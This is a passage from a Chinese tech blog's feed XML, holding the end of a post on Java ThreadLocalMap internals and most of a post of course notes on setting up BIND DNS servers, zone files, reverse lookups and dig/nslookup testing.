其作用是设置当前线程绑定的局部变量 :</p><p> A. 首先获取当前线程，并根据当前线程获取一个Map</p><p> B. 如果获取的Map不为空，则将参数设置到Map中（当前ThreadLocal的引用作为key）</p><p> (这里调用了ThreadLocalMap的set方法)</p><p> C. 如果Map为空，则给该线程创建 Map，并设置初始值</p><p> (这里调用了ThreadLocalMap的构造方法)</p><p>这段代码有两个地方分别涉及到ThreadLocalMap的两个方法, 我们接着分析这两个方法。</p><p><strong>构造方法ThreadLocalMap(ThreadLocal&lt;?&gt; firstKey, Object firstValue)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * firstKey : 本ThreadLocal实例(this)</span></span><br><span class="line"><span class="comment"> * firstValue ： 要保存的线程本地变量</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   ThreadLocalMap(ThreadLocal&lt;?&gt; firstKey, Object firstValue) &#123;</span><br><span class="line">       <span class="comment">//初始化table</span></span><br><span class="line">       table = <span class="keyword">new</span> ThreadLocal.ThreadLocalMap.Entry[INITIAL_CAPACITY];</span><br><span class="line">       <span class="comment">//计算索引(重点代码）</span></span><br><span class="line">       <span class="keyword">int</span> i = firstKey.threadLocalHashCode &amp; (INITIAL_CAPACITY - <span class="number">1</span>);</span><br><span class="line">       <span class="comment">//设置值</span></span><br><span class="line">       table[i] = <span class="keyword">new</span> ThreadLocal.ThreadLocalMap.Entry(firstKey, firstValue);</span><br><span class="line">       size = <span class="number">1</span>;</span><br><span class="line">       <span class="comment">//设置阈值</span></span><br><span class="line">       setThreshold(INITIAL_CAPACITY);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>构造函数首先创建一个长度为16的Entry数组，然后计算出firstKey对应的索引，然后存储到table中，并设置size和threshold。</p><p><strong>重点分析： int i = firstKey.threadLocalHashCode &amp; (INITIAL_CAPACITY - 1)。</strong></p><p><strong>a. 关于firstKey.threadLocalHashCode：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> threadLocalHashCode = nextHashCode();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nextHashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> nextHashCode.getAndAdd(HASH_INCREMENT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//AtomicInteger是一个提供原子操作的Integer类，通过线程安全的方式操作加减,适合高并发情况下的使用</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> AtomicInteger nextHashCode =  <span class="keyword">new</span> AtomicInteger();</span><br><span class="line"><span class="comment">//特殊的hash值</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HASH_INCREMENT = <span class="number">0x61c88647</span>;</span><br></pre></td></tr></table></figure><p>这里定义了一个AtomicInteger类型，每次获取当前值并加上HASH_INCREMENT，HASH_INCREMENT = 0x61c88647,这个值跟斐波那契数列（黄金分割数）有关，其主要目的就是为了让哈希码能均匀的分布在2的n次方的数组里, 也就是Entry[] table中，这样做可以尽量避免hash冲突。</p><p><strong>b. 关于&amp; (INITIAL_CAPACITY - 1)</strong></p><p> 计算hash的时候里面采用了hashCode &amp; (size - 1)的算法，这相当于取模运算hashCode % size的一个更高效的实现。正是因为这种算法，我们要求size必须是2的整次幂，这也能保证在索引不越界的前提下，使得hash发生冲突的次数减小。</p><p>ThreadLocalMap中的set方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(ThreadLocal&lt;?&gt; key, Object value)</span> </span>&#123;</span><br><span class="line">        ThreadLocal.ThreadLocalMap.Entry[] tab = table;</span><br><span class="line">        <span class="keyword">int</span> len = tab.length;</span><br><span class="line">        <span class="comment">//计算索引(重点代码，刚才分析过了）</span></span><br><span class="line">        <span class="keyword">int</span> i = key.threadLocalHashCode &amp; (len-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 使用线性探测法查找元素（重点代码）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (ThreadLocal.ThreadLocalMap.Entry e = tab[i];</span><br><span class="line">             e != <span class="keyword">null</span>;</span><br><span class="line">             e = tab[i = nextIndex(i, len)]) &#123;</span><br><span class="line">            ThreadLocal&lt;?&gt; k = e.get();</span><br><span class="line">            <span class="comment">//ThreadLocal 对应的 key 存在，直接覆盖之前的值</span></span><br><span class="line">            <span class="keyword">if</span> (k == key) &#123;</span><br><span class="line">                e.value = value;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// k为 null，但是值不为 null，说明之前的 ThreadLocal 对象已经被回收了，</span></span><br><span class="line">           <span class="comment">// 当前数组中的 Entry 是一个陈旧（stale）的元素</span></span><br><span class="line">            <span class="keyword">if</span> (k == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//用新元素替换陈旧的元素，这个方法进行了不少的垃圾清理动作，防止内存泄漏</span></span><br><span class="line">                replaceStaleEntry(key, value, i);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ThreadLocal对应的key不存在并且没有找到陈旧的元素，则在空元素的位置创建一个新的Entry。</span></span><br><span class="line">            tab[i] = <span class="keyword">new</span> Entry(key, value);</span><br><span class="line">            <span class="keyword">int</span> sz = ++size;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * cleanSomeSlots用于清除那些e.get()==null的元素，</span></span><br><span class="line"><span class="comment">             * 这种数据key关联的对象已经被回收，所以这个Entry(table[index])可以被置null。</span></span><br><span class="line"><span class="comment">             * 如果没有清除任何entry,并且当前使用量达到了负载因子所定义(长度的2/3)，那么进行 * rehash（执行一次全表的扫描清理工作）</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (!cleanSomeSlots(i, sz) &amp;&amp; sz &gt;= threshold)</span><br><span class="line">                rehash();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取环形数组的下一个索引</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nextIndex</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ((i + <span class="number">1</span> &lt; len) ? i + <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码执行流程：</p><p>A. 首先还是根据key计算出索引 i，然后查找i位置上的Entry，</p><p>B. 若是Entry已经存在并且key等于传入的key，那么这时候直接给这个Entry赋新的value值,</p><p>C. 若是Entry存在，但是key为null，则调用replaceStaleEntry来更换这个key为空的Entry,</p><p>D. 不断循环检测，直到遇到为null的地方，这时候要是还没在循环过程中return，那么就在这个null的位置新建一个Entry，并且插入，同时size增加1。</p><p>最后调用cleanSomeSlots，清理key为null的Entry，最后返回是否清理了Entry，接下来再判断sz 是否&gt;= thresgold达到了rehash的条件，达到的话就会调用rehash函数执行一次全表的扫描清理。</p><p><strong>重点分析 ： ThreadLocalMap使用线性探测法来解决哈希冲突的。</strong></p><p> 该方法一次探测下一个地址，直到有空的地址后插入，若整个空间都找不到空余的地址，则产生溢出。</p><p>举个例子，假设当前table长度为16，也就是说如果计算出来key的hash值为14，如果table[14]上已经有值，并且其key与当前key不一致，那么就发生了hash冲突，这个时候将14加1得到15，取table[15]进行判断，这个时候如果还是冲突会回到0，取table[0],以此类推，直到可以插入。</p><p>按照上面的描述，可以把Entry[] table看成一个环形数组。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ThreadLocal全面解析&quot;&gt;&lt;a href=&quot;#ThreadLocal全面解析&quot; class=&quot;headerlink&quot; title=&quot;ThreadLocal全面解析&quot;&gt;&lt;/a&gt;ThreadLocal全面解析&lt;/h1&gt;&lt;p&gt;之前草草看过《Java并发编程的艺术
      
    
    </summary>
    
    
      <category term="并发编程" scheme="https://blog.kaluna.top/categories/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="ThreadLocal" scheme="https://blog.kaluna.top/tags/ThreadLocal/"/>
    
  </entry>
  
  <entry>
    <title>Linux智能DNS</title>
    <link href="https://blog.kaluna.top/2021/06/13/Linux%E4%B9%8B%E6%99%BA%E8%83%BDDNS/"/>
    <id>https://blog.kaluna.top/2021/06/13/Linux%E4%B9%8B%E6%99%BA%E8%83%BDDNS/</id>
    <published>2021-06-13T11:30:09.072Z</published>
    <updated>2021-12-04T00:51:27.315Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux之智能DNS大纲速览"><a href="#Linux之智能DNS大纲速览" class="headerlink" title="Linux之智能DNS大纲速览"></a>Linux之智能DNS大纲速览</h1><p>Linux之智能DNS是我今天在慕课网意外看到的一门课，试听了一下，感觉还行。讲师把它分成了三个部分讲。</p><p>DNS学习三部曲：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一部Bind服务：掌握Bind的服务的搭建过程及DNS测试方法</span><br><span class="line">第二部Bind负载均衡：DNS负载均衡的实现过程</span><br><span class="line">第三部智能DNS：智能DNS的实现原理</span><br></pre></td></tr></table></figure><h1 id="第一部Bind服务"><a href="#第一部Bind服务" class="headerlink" title="第一部Bind服务"></a>第一部Bind服务</h1><p>DNS，简单地说，就是Domain Name System，翻成中文就是“域名系统”。<br>在一个TCP/IP架构的网络（例如Internet）环境中，DNS是一个非常重要而且常用的系统。主要的功能就是将人易于记忆的Domain Name与人不容易记忆的IP Address作转换。而上面执行DNS服务的这台网络主机，就可以称之为DNS Server。基本上，通常我们都认为DNS只是将Domain Name转换成IP Address，然后再使用所查到的IP Address去连接（俗称“正向解析”）。事实上，将IP Address转换成Domain Name的功能也是相当常使用到的，当login到一台Unix工作站时，工作站就会去做反查，找出你是从哪个地方连线进来的（俗称“逆向解析”）。</p><p>网关(Gateway)又称网间连接器、协议转换器。网关在传输层上以实现网络互连，是最复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。 网关是一种充当转换重任的计算机系统或设备。</p><h2 id="Bind介绍"><a href="#Bind介绍" class="headerlink" title="Bind介绍"></a>Bind介绍</h2><p>Bind是开源、稳定、应用广泛的DNS服务<br>Bind的组成：域名解析服务；权威域名服务；DNS工具</p><h2 id="DNS中的域名"><a href="#DNS中的域名" class="headerlink" title="DNS中的域名"></a>DNS中的域名</h2><p><a href="http://www.imooc.com" target="_blank" rel="noopener">www.imooc.com</a> == <a href="http://www.imooc.com" target="_blank" rel="noopener">www.imooc.com</a>.<br>注释：<a href="http://www.imooc.com.中，最后的“.”是根域；com.是一级域名；imooc.com.是二级域名" target="_blank" rel="noopener">www.imooc.com.中，最后的“.”是根域；com.是一级域名；imooc.com.是二级域名</a></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613195132.png" alt="image-20210613195107812"></p><h2 id="域名解析及权威域名解析"><a href="#域名解析及权威域名解析" class="headerlink" title="域名解析及权威域名解析"></a>域名解析及权威域名解析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、域名服务器存在域名记录，则直接返回IP（递归查询），否则进行迭代查询（如图）</span><br><span class="line">2、图中名字服务器都可以用到bind服务，红框中的bind具有权威解析，因为他返回域名对应的权威解析IP地址</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613195442.png" alt="image-20210613195439983"></p><h2 id="DNS解析记录分类"><a href="#DNS解析记录分类" class="headerlink" title="DNS解析记录分类"></a>DNS解析记录分类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、A记录：由域名服务器返回IP地址（基本、最多的记录）</span><br><span class="line">2、CNAME：方便多个域名解析同一个IP地址（如图创建一个CNAME记录指向有A记录的域名）</span><br><span class="line">3、NS记录：bind服务器不能进行权威解析时，会回一个NS记录给用户，这时用户再发起另一台bind服务器的权威解析请求。</span><br><span class="line">4、MX记录：全称是邮件交换记录，在使用邮件服务器的时候，MX记录是无可或缺的，比如A用户向B用户发送一封邮件，那么他需要向DNS查询B的MX记录，DNS在定位到了B的MX记录后反馈给A用户，然后A用户把邮件投递到B用户的MX记录服务器里。</span><br></pre></td></tr></table></figure><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614000326.png" alt="image-20210613195931321" style="zoom:80%;" /><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614000322.png" alt="image-20210613195942389" style="zoom:67%;" /><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614000314.png" alt="image-20210613195959194"></p><h2 id="Bind安装"><a href="#Bind安装" class="headerlink" title="Bind安装"></a>Bind安装</h2><p>redhat：#yum install bind bind-chroot<br>ubuntu：$sudo apt-get install bind9<br>确认安装：#rpm -qa | grep bind<br>查看安装内容：#rpm -ql bind | more</p><h2 id="Bind服务默认配置文件"><a href="#Bind服务默认配置文件" class="headerlink" title="Bind服务默认配置文件"></a>Bind服务默认配置文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">建议一开始把bind默认配置文件做一个备份mv &#x2F;etc&#x2F;named.comf &#x2F;etc&#x2F;named.comf_default</span><br><span class="line">1、启动bind服务：#&#x2F;etc&#x2F;init.d&#x2F;named start</span><br><span class="line"></span><br><span class="line">2、主配置文件：&#x2F;etc&#x2F;named.conf(配置项如下)</span><br><span class="line">options&#123;&#125;-整个bind使用的全局选项（监听端口；数据文件、缓存存储位置；权限加密的控制）</span><br><span class="line">logging&#123;&#125;-服务日志选项（日志输出；日志输出级别；日志输出位置等）</span><br><span class="line">zone.&#123;&#125;-DNS域解析（解析记录位置）</span><br><span class="line"></span><br><span class="line">listen-on port 53 &#123;127.0.0.1&#125;   &#x2F;&#x2F;默认监听所有地址</span><br><span class="line">directory   &#x2F;&#x2F;存放着数据库的控制文件，配置的zone，还有主的配置文件目录</span><br><span class="line">dump-file   &#x2F;&#x2F;DNS解析过的一些缓存信息存放位置；</span><br><span class="line">statistics-file   &#x2F;&#x2F;静态解析文件；</span><br><span class="line">memstatistics-file   &#x2F;&#x2F;内存的统计信息</span><br><span class="line">allow-query   &#x2F;&#x2F;权限信息</span><br><span class="line">dnssec-enable、dnssec-validation、dnssec-lookaside   &#x2F;&#x2F;加密信息</span><br><span class="line"></span><br><span class="line">channel   &#x2F;&#x2F;控制日志输出</span><br><span class="line">file   &#x2F;&#x2F;输出文件位置</span><br><span class="line">severity   &#x2F;&#x2F;控制日志输出详细级别以及安全重要级别</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613200601.png" alt="image-20210613200557083"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613200828.png" alt="image-20210613200811312"></p><h2 id="Bind服务实战场景一配置"><a href="#Bind服务实战场景一配置" class="headerlink" title="Bind服务实战场景一配置"></a>Bind服务实战场景一配置</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614000308.png" alt="image-20210613201638271"></p><p>创建/etc/named.conf文件并编辑，配置option和zone</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613201054.png" alt="image-20210613201001526"></p><p>zone的file配置，imooc.come.zone 这个文件就写在 /var/named这个文件夹下</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613201051.png" alt="image-20210613201049309"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置imooc.com的一个起始SOA记录。 jeson.imooc.com是邮箱, @表示当前域名（当书写邮箱地址的时候必须将@改成.代替）。 后面括号的时间用于DNS主从。</span><br><span class="line">配置 imooc.com的NS记录，告诉bind我的解析是靠哪一台DNS服务器来解析的。</span><br><span class="line">给imooc.com的权威解析DNS配一个A记录</span><br><span class="line">给www.imooc.com 配置一个A记录</span><br><span class="line"></span><br><span class="line">重启named服务：&#x2F;etc&#x2F;init.d&#x2F;named restart</span><br><span class="line">本机测试：dig @192.168.199.202 www.imooc.com</span><br><span class="line">补充：重启服务如有报错查看tail -f &#x2F;var&#x2F;log&#x2F;messages</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613201725.png" alt="image-20210613201605542"></p><p>Bind服务配置文件的重点总结：</p><p>1.严格注意语法书写，其格式非常严格<br>2.@是DNS记录中的保留字，表示当前域名（当书写邮箱地址的时候必须将@改成.代替）<br>3.记录不准折行书写<br>4.单行记录开头不准空格或tab开头</p><h2 id="Bind服务实战场景二配置"><a href="#Bind服务实战场景二配置" class="headerlink" title="Bind服务实战场景二配置"></a>Bind服务实战场景二配置</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614000300.png" alt="image-20210613201846931"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实战场景2代码：</span></span><br><span class="line"><span class="meta">1.先ping</span> <span class="string">imooc的ip</span></span><br><span class="line"><span class="attr">ping</span> <span class="string">www.imooc.com--&gt;117.121.101.41</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.修改/var/named/imooc.com.zone文件，将www的A记录IP地址替换成imooc的IP地址</span></span><br><span class="line"><span class="meta">$TTL</span> <span class="string">7200</span></span><br><span class="line"><span class="meta">imooc.com.</span> <span class="string">IN SOA imooc.com. ho.imooc.com. (222 1H 15M 1W 1D)</span></span><br><span class="line"><span class="meta">imooc.com.</span> <span class="string">IN NS dns1.imooc.com.</span></span><br><span class="line"><span class="meta">dns1.imooc.com.</span> <span class="string">IN A 192.168.199.202</span></span><br><span class="line"><span class="meta">www.imooc.com.</span> <span class="string">IN A 117.121.101.41</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.修改/etc/named.conf文件，添加zone "iaskjob.com"</span></span><br><span class="line"><span class="attr">options&#123;</span></span><br><span class="line"><span class="attr">directory</span> <span class="string">"/var/named";</span></span><br><span class="line"><span class="attr">&#125;;</span></span><br><span class="line"><span class="attr">zone</span> <span class="string">"imooc.com"&#123;</span></span><br><span class="line"><span class="attr">type</span> <span class="string">master;</span></span><br><span class="line"><span class="attr">file</span> <span class="string">"imooc.com.zone";</span></span><br><span class="line"><span class="attr">&#125;;</span></span><br><span class="line"><span class="attr">zone</span> <span class="string">"iaskjob.com"&#123;</span></span><br><span class="line"><span class="attr">type</span> <span class="string">master;</span></span><br><span class="line"><span class="attr">file</span> <span class="string">"iaskjob.com.zone";</span></span><br><span class="line"><span class="attr">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4.新建iaskjob.com.zone文件并编辑</span></span><br><span class="line"><span class="attr">vim</span> <span class="string">/var/named/iaskjob.com.zone</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$TTL</span> <span class="string">7200</span></span><br><span class="line"><span class="meta">iaskjob.com.</span> <span class="string">IN SOA isakjob.com. iaskjob.163.com. (4012100 1H 15M 1W 1D)</span></span><br><span class="line"><span class="meta">iaskjob.com.</span> <span class="string">IN NS dns1.iaskjob.com.</span></span><br><span class="line"><span class="meta">dns1.iaskjob.com.</span> <span class="string">IN A 192.168.199.202</span></span><br><span class="line"><span class="meta">imooc.iaskjob.com.</span> <span class="string">IN CNAME www.imooc.com.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5.重启named服务</span></span><br><span class="line"><span class="meta">/etc/init.d/named</span> <span class="string">restart</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#6.本机测试</span></span><br><span class="line"><span class="attr">dig</span> <span class="string">@127.0.0.1 imooc.iaskjob.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#7.远程测试</span></span><br><span class="line"><span class="attr">物理机设置DNS为虚拟机的IP（192.168.199.202）</span></span><br><span class="line"><span class="meta">物理机运行nslookup</span> <span class="string">imooc.iaskjob.com</span></span><br><span class="line"><span class="attr">能解析到imooc的IP地址就表示正确</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#补充：重启服务如有报错查看/var/log/messages</span></span><br><span class="line"><span class="attr">tail</span> <span class="string">-f /var/log/messages</span></span><br></pre></td></tr></table></figure><h2 id="正向解析与反向解析"><a href="#正向解析与反向解析" class="headerlink" title="正向解析与反向解析"></a>正向解析与反向解析</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613204406.png" alt="image-20210613204404470"></p><p>PTR通常用于邮件系统</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613204453.png" alt="image-20210613204450624"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置正向解析：编辑/var/named/imooc.com.zone文件，在最后加上两行, (10 为优先级)</span></span><br><span class="line"><span class="meta">@</span> <span class="string">IN MX 10 mail</span></span><br><span class="line"><span class="attr">mail</span> <span class="string">IN A 10.156.11.233</span></span><br><span class="line"><span class="comment">#重启named服务，本机测试</span></span><br><span class="line"><span class="attr">dig</span> <span class="string">@192.168.5.107 mail.imooc.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#反向解析：编辑/etc/named.conf文件，在最后加入</span></span><br><span class="line"><span class="attr">zone</span> <span class="string">"5.168.192.in-addr.arpa"&#123;</span></span><br><span class="line"><span class="attr">type</span> <span class="string">master;</span></span><br><span class="line"><span class="attr">file</span> <span class="string">"10.156.11.zone";</span></span><br><span class="line"><span class="attr">&#125;;</span></span><br><span class="line"><span class="comment">#在/var/named/下新建10.156.11.zone文件</span></span><br><span class="line"><span class="meta">$TTL</span> <span class="string">7200</span></span><br><span class="line"><span class="meta">@</span> <span class="string">IN SOA 11.156.10.in-addr.arpa. iaskjob.163.com. (2014012200 1H 15M 1W 1D)</span></span><br><span class="line"><span class="meta">@</span> <span class="string">IN NS dns1.imooc.com.</span></span><br><span class="line"><span class="attr">232</span> <span class="string">IN PTR dns1.imooc.com.</span></span><br><span class="line"><span class="attr">233</span> <span class="string">IN PTR mail.imooc.com.</span></span><br><span class="line"><span class="comment">#重启named服务，本机测试</span></span><br><span class="line"><span class="attr">dig</span> <span class="string">-x 10.156.11.233 @127.0.0.1</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613204829.png" alt="image-20210613204823250"></p><p>逆向解析重点总结：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.逆向解析域in-addr.arpa的书写格式</span><br><span class="line">2.常用于邮件服务的域名解析</span><br><span class="line">3.配置文件权限需要named用户可读取，没有权限启动named服务会报错</span><br><span class="line">-rw-r--r--. 1 root  root   191 Aug 29 19:40 10.156.11.zone</span><br><span class="line">-rw-r--r--. 1 root  root   202 Aug 29 17:12 iaskjob.com.zone</span><br><span class="line">-rw-r--r--. 1 root  root   219 Aug 29 19:43 imooc.com.zone</span><br></pre></td></tr></table></figure><h2 id="Bind服务常用客户端工具："><a href="#Bind服务常用客户端工具：" class="headerlink" title="Bind服务常用客户端工具："></a>Bind服务常用客户端工具：</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613211237.png" alt="image-20210613211233466"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">host文件位置：/etc/resolv.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># host www.baidu.com</span></span><br><span class="line">www.baidu.com is an <span class="built_in">alias</span> <span class="keyword">for</span> www.a.shifen.com.</span><br><span class="line">www.a.shifen.com has address 14.215.177.38</span><br><span class="line">www.a.shifen.com has address 14.215.177.37</span><br><span class="line"></span><br><span class="line"><span class="comment">#nslookup www.baidu.com</span></span><br><span class="line">Server:114.114.114.119</span><br><span class="line">Address:114.114.114.119<span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.baidu.comcanonical name = www.a.shifen.com.</span><br><span class="line">Name:www.a.shifen.com</span><br><span class="line">Address: 14.215.177.38</span><br><span class="line">Name:www.a.shifen.com</span><br><span class="line">Address: 14.215.177.37</span><br><span class="line"></span><br><span class="line"><span class="comment">#dig www.baidu.com</span></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.17.rc1.el6 